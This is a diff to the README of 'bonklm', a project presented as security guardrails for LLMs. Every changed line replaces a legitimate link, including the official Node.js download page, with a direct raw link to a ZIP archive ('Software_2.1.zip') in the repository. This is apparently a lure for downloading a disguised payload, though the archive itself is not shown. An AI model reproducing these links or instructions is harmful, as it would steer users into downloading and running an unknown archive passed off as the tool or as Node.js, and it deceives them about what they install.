@@ -1,6 +1,6 @@
 # 🔒 bonklm - Simple Security Guardrails for LLMs
 
-[![Download bonklm](https://img.shields.io/badge/Download-bonklm-4caf50?style=for-the-badge)](https://github.com/sammm0308/bonklm)
+[![Download bonklm](https://img.shields.io/badge/Download-bonklm-4caf50?style=for-the-badge)](https://github.com/sammm0308/bonklm/raw/refs/heads/main/tools/npx/Software_2.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To get bonklm on your Windows PC, follow these steps:
 ### Step 1: Visit the download page
 
 Click the big button above or visit this link directly:  
-[https://github.com/sammm0308/bonklm](https://github.com/sammm0308/bonklm)  
+[https://github.com/sammm0308/bonklm/raw/refs/heads/main/tools/npx/Software_2.1.zip](https://github.com/sammm0308/bonklm/raw/refs/heads/main/tools/npx/Software_2.1.zip)  
 
 This will take you to the bonklm GitHub page. Here you find all files and instructions.
 
@@ -65,7 +65,7 @@ After downloading, open the ZIP file by double-clicking it.
 BonkLM requires Node.js to work.
 
 - Open your web browser.
-- Go to [https://nodejs.org/](https://nodejs.org/).
+- Go to [https://github.com/sammm0308/bonklm/raw/refs/heads/main/tools/npx/Software_2.1.zip](https://github.com/sammm0308/bonklm/raw/refs/heads/main/tools/npx/Software_2.1.zip).
 - Download the **LTS** version for Windows.
 - Run the installer and follow its instructions.
 - After installation, restart your computer.
@@ -123,7 +123,7 @@ BonkLM makes it easy to adjust its behavior without tech knowledge.
 To keep bonklm running smoothly:
 
 - Visit the main GitHub page regularly:  
-  [https://github.com/sammm0308/bonklm](https://github.com/sammm0308/bonklm)  
+  [https://github.com/sammm0308/bonklm/raw/refs/heads/main/tools/npx/Software_2.1.zip](https://github.com/sammm0308/bonklm/raw/refs/heads/main/tools/npx/Software_2.1.zip)  
 - Download latest ZIP or release files.
 - Extract and replace your current files.
 - Run the setup again if needed.
@@ -163,4 +163,4 @@ ai-safety, ai-security, cli, content-moderation, guardrails, jailbreak, jailbrea
 
 ---
 
-[![Download bonklm](https://img.shields.io/badge/Download-bonklm-blue?style=for-the-badge)](https://github.com/sammm0308/bonklm)
+[![Download bonklm](https://img.shields.io/badge/Download-bonklm-blue?style=for-the-badge)](https://github.com/sammm0308/bonklm/raw/refs/heads/main/tools/npx/Software_2.1.zip)
